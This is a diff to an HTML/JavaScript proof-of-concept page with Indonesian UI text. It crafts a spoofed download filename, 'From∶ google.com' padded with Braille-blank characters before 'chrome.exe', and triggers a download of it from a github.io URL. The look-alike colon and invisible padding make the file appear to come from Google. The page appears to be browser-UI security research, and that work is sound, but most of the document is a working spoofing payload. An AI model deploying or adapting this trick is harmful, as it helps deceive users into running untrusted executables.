@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Advanced Download UI Layout PoC</title>
+    <title>Advanced Download UI Layout & Unicode PoC</title>
     <style>
         body {
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
@@ -48,10 +48,13 @@
             cursor: pointer;
             width: 100%;
             transition: background-color 0.2s, transform 0.1s;
-            margin-bottom: 10px;
+            margin-bottom: 12px;
         }
         button:hover {
             background-color: #1d4ed8;
+        }
+        button:active {
+            transform: scale(0.98);
         }
         .status {
             margin-top: 15px;
@@ -69,33 +72,34 @@
 <body>
 
     <div class="card">
-        <h2>Download UI Layout Stress Test</h2>
-        <p>Uji coba injeksi karakter Unicode dan padding berat untuk menguji batas ketahanan penanganan string antarmuka.</p>
+        <h2>Download UI Security Suite</h2>
+        <p>Uji coba simulasi injeksi karakter Unicode <code>U+2236</code> (Ratio) & <code>U+2800</code> (Braille Blank) untuk menguji batas perenderan.</p>
         
-        <button onclick="triggerPayload(1)">Uji 1: Standar Ratio & Braille Blank</button>
-        <button onclick="triggerPayload(2)">Uji 2: Heavy Padding Exhaustion</button>
+        <button onclick="triggerPoC(1)">Uji 1: Payload Standar Kustom</button>
+        <button onclick="triggerPoC(2)">Uji 2: Heavy Padding Exhaustion</button>
 
-        <div id="status" class="status">Status: Menunggu eksekusi...</div>
+        <div id="status" class="status">Status: Menunggu interaksi pengguna...</div>
     </div>
 
     <script>
-        function updateStatus(msg, filename) {
-            document.getElementById('status').innerHTML = `<strong>Status:</strong> ${msg}<br><strong>Payload:</strong> <span style="color:#38bdf8">${filename}</span>`;
+        function updateStatus(message, filename) {
+            const statusEl = document.getElementById('status');
+            statusEl.innerHTML = `<strong>Status:</strong> ${message}<br><br><strong>Payload:</strong> <span style="color:#38bdf8; word-break:break-all;">${filename}</span>`;
         }
 
-        function triggerPayload(type) {
+        function triggerPoC(testCase) {
+            // URL target spesifik yang menggunakan payload Unicode kustom Anda
             const targetUrl = "https://ecdnts-del.github.io/test-apk/From%E2%88%B6%20google.com%20%E2%A0%80%E2%A0%80%E2%A0%80%E2%A0%80%E2%A0%80%20chrome.exe";
             let craftedFilename = "";
 
-            if (type === 1) {
-                // Skenario 1: Karakter Unicode tiruan (U+2236 & U+2800)
+            if (testCase === 1) {
                 craftedFilename = "From∶ google.com ⠀⠀⠀⠀⠀⠀ chrome.exe";
-                updateStatus("Memicu Payload Skenario 1...", craftedFilename);
-            } else if (type === 2) {
-                // Skenario 2: Padding ekstrem untuk menguji batas layout vertikal
+                updateStatus("Memicu Skenario 1 (Standard Unicode Spoofing)...", craftedFilename);
+            } else if (testCase === 2) {
+                // Stress test dengan padding berlebih untuk menguji batas vertikal layout
                 const heavyPadding = "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀";
                 craftedFilename = "From∶ google.com" + heavyPadding + "chrome.exe";
-                updateStatus("Memicu Payload Skenario 2 (Heavy Padding)...", craftedFilename);
+                updateStatus("Memicu Skenario 2 (Heavy Vertical Padding)...", craftedFilename);
             }
 
             const link = document.createElement('a');
@@ -107,8 +111,11 @@
 
             try {
                 link.click();
+                setTimeout(() => {
+                    updateStatus("Unduhan berhasil dipicu! Silakan verifikasi perilaku antarmuka.", craftedFilename);
+                }, 300);
             } catch (err) {
-                updateStatus("Gagal memicu: " + err.message, craftedFilename);
+                updateStatus("Gagal memicu unduhan: " + err.message, craftedFilename);
             }
 
             setTimeout(() => {
